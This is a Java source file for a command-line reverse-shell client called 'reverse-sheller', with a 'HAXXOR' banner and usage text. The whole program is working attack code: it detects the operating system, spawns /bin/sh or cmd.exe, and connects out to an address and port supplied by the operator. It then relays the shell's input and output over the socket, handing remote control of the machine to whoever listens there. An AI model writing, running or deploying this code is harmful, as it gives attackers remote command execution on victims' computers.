package dev.drzymala.client;

import lombok.NoArgsConstructor;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Objects;

@NoArgsConstructor
public class ClientReverseSheller {

    private InetSocketAddress inetServerSocket;
    String detectedOs;
    String detectedShell;
    private final byte[] buffer = new byte[1024];
    private int charLen = 0;
    private boolean error = false;

    public ClientReverseSheller(String ipAddress, int port) {
        this.inetServerSocket = new InetSocketAddress(ipAddress, port);
    }

    public static void main(String[] args) throws IOException {

        System.out.println();
        System.out.print("8 8888        8          .8.          `8.`8888.      ,8' `8.`8888.      ,8'  ,o888888o.     8 888888888o.\n");
        System.out.print("8 8888        8         .888.          `8.`8888.    ,8'   `8.`8888.    ,8'. 8888     `88.   8 8888    `88.\n");
        System.out.print("8 8888        8        :88888.          `8.`8888.  ,8'     `8.`8888.  ,8',8 8888       `8b  8 8888     `88\n");
        System.out.print("8 8888        8       . `88888.          `8.`8888.,8'       `8.`8888.,8' 88 8888        `8b 8 8888     ,88\n");
        System.out.print("8 8888        8      .8. `88888.          `8.`88888'         `8.`88888'  88 8888         88 8 8888.   ,88'  \n");
        System.out.print("8 8888        8     .8`8. `88888.         .88.`8888.         .88.`8888.  88 8888         88 8 888888888P'   \n");
        System.out.print("8 8888888888888    .8' `8. `88888.       .8'`8.`8888.       .8'`8.`8888. 88 8888        ,8P 8 8888`8b       \n");
        System.out.print("8 8888        8   .8'   `8. `88888.     .8'  `8.`8888.     .8'  `8.`8888.`8 8888       ,8P  8 8888 `8b.     \n");
        System.out.print("8 8888        8  .888888888. `88888.   .8'    `8.`8888.   .8'    `8.`8888.` 8888     ,88'   8 8888   `8b.   \n");
        System.out.print("8 8888        8 .8'       `8. `88888. .8'      `8.`8888. .8'      `8.`8888.  `8888888P'     8 8888     `88.\n");
        System.out.println();
        if (args.length != 2) {
            System.out.print("Usage: java -jar reverse-sheller-0.0.1.jar <addr> <port>\n");
        } else {
            boolean error = false;
            args[0] = args[0].trim();
            if (args[0].length() < 1) {
                error = true;
                System.out.print("<addr> is required\n");
            }
            int port = -1;
            args[1] = args[1].trim();
            if (args[1].length() < 1) {
                error = true;
                System.out.print("<port> is required\n");
            } else {
                try {
                    port = Integer.parseInt(args[1]);
                    if (port < 0 || port > 65535) {
                        error = true;
                        System.out.print("<port> must be between 0 - 65535\n");
                    }
                } catch (NumberFormatException ex) {
                    error = true;
                    System.out.print("\"<port> is not valid\n");
                }
            }
            if (!error) {
                ClientReverseSheller shellInstance = new ClientReverseSheller(args[0], port);
                shellInstance.connect();
                System.gc();
            }
        }
    }

    private void connect() {

        detectOperatingSystem();
        OutputStream remoteStdin = null;
        InputStream remoteStdout = null;
        InputStream remoteStderr = null;
        InputStream clientSocketInput = null;
        OutputStream clientSocketOutput = null;

        try {
            Socket clientSocket = new Socket();
            clientSocket.setSoTimeout(100);
            clientSocket.connect(inetServerSocket);

            Process remoteShell = new ProcessBuilder(this.detectedShell).redirectInput(ProcessBuilder.Redirect.PIPE)
                    .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
            System.out.println("Haxxor connected “ψ (｀∇´) ψ ... ◥(ฅº￦ºฅ)◤ ...\n");

            remoteStdin = remoteShell.getOutputStream();
            remoteStdout = remoteShell.getInputStream();
            remoteStderr = remoteShell.getErrorStream();
            clientSocketInput = clientSocket.getInputStream();
            clientSocketOutput = clientSocket.getOutputStream();

            do {
                if (!remoteShell.isAlive()) {
                    System.out.println("Remote shell has been terminated\n\n");
                    break;
                }
                this.readRemoteShell(clientSocketInput, remoteStdin, "SOCKET", "STDIN");
                if (remoteStderr.available() > 0) {
                    this.readRemoteShell(remoteStderr, clientSocketOutput, "STDERR", "SOCKET");
                }
                if (remoteStdout.available() > 0) {
                    this.readRemoteShell(remoteStdout, clientSocketOutput, "STDOUT", "SOCKET");
                }
            } while (!this.error);
            System.out.println("EXIT");
        } catch (IOException e) {
            System.out.println("ERROR: " + e.getMessage());
        } finally {
            try {
                Objects.requireNonNull(remoteStdin).close();
                Objects.requireNonNull(remoteStdout).close();
                Objects.requireNonNull(remoteStderr).close();
                Objects.requireNonNull(clientSocketInput).close();
                Objects.requireNonNull(clientSocketOutput).close();
            } catch (IOException ignored) {
            }
        }
    }

    private void detectOperatingSystem() {

        boolean detected = true;
        this.detectedOs = System.getProperty("os.name").toUpperCase();
        if (this.detectedOs.contains("LINUX") || this.detectedOs.contains("MAC")) {
            this.detectedOs = "LINUX";
            this.detectedShell = "/bin/sh";
        } else if (this.detectedOs.contains("WIN")) {
            this.detectedOs = "WINDOWS";
            this.detectedShell = "cmd.exe";
        } else {
            detected = false;
            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
        }
    }

    private void readRemoteShell(InputStream input, OutputStream output, String inputName, String outputName) {

        int bytes = 0;
        try {
            do {
                if (this.detectedOs.equals("WINDOWS") && inputName.equals("STDOUT") && this.charLen > 0) {
                    do {
                        bytes = input.read(this.buffer, 0, Math.min(this.charLen, this.buffer.length));
                        this.charLen -= Math.min(this.charLen, this.buffer.length);
                    } while (bytes > 0 && this.charLen > 0);
                } else {
                    bytes = input.read(this.buffer, 0, this.buffer.length);
                    if (bytes > 0) {
                        output.write(this.buffer, 0, bytes);
                        output.flush();
                        if (this.detectedOs.equals("WINDOWS") && outputName.equals("STDIN")) {
                            this.charLen += bytes;
                        }
                    } else if (inputName.equals("SOCKET")) {
                        this.error = true;
                        System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
                    }
                }
            } while (input.available() > 0);
        } catch (SocketTimeoutException ignored) {
        } catch (IOException ex) {
            this.error = true;
            System.out.println("STRM_ERROR: Cannot write to: " + outputName + ", or read from: " + inputName);
        }
    }
}
